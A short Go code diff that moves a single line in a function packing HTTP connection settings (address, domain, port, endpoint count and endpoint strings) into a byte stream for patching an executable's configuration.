@@ -237,11 +237,10 @@ func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
 			stream.PackWString(httpConfig.Address)
 			stream.PackString(httpConfig.Domain)
 			stream.PackDword(uint32(httpConfig.Port))
+			stream.PackDword(uint32(len(httpConfig.Endpoints)))
 
 			// endpoints always need specified
 			// todo: add random endpoints when not specified. use seclists or smth.
-
-			stream.PackDword(uint32(len(httpConfig.Endpoints)))
 
 			for _, uri := range httpConfig.Endpoints {
 				stream.PackWString(uri)
